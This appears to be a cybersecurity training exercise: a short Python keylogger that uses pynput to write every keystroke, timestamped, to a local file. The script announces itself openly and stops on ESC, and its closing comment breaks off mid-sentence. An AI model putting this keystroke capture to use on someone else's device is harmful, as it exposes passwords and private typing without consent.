# SCT_CYBER 04 - Basic Keylogger (Enhanced)
# Author: Shivam Raj

from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def write_log(key):
    """Writes a single keystroke to the log file with timestamp"""
    with open(LOG_FILE, "a") as f:
        time_stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        if hasattr(key, 'char') and key.char is not None:
            f.write(f"[{time_stamp}] {key.char}\n")
        else:
            f.write(f"[{time_stamp}] [{key}]\n")

def on_press(key):
    """Callback for key press"""
    write_log(key)

    # Optional: Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        print("\n[+] ESC pressed — Keylogger stopped.")
        return False

def main():
    print("="*40)
    print("   === Basic Keylogger Started ===")
    print(f"   [LOG FILE] {LOG_FILE}")
    print("   [INFO] Press ESC to stop logging.")
    print("="*40)

    # Start listening
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
# This code implements a basic keylogger that logs keystrokes to a file with timestamps.
# It uses the pynput library to listen for keyboard events and writes each keystroke to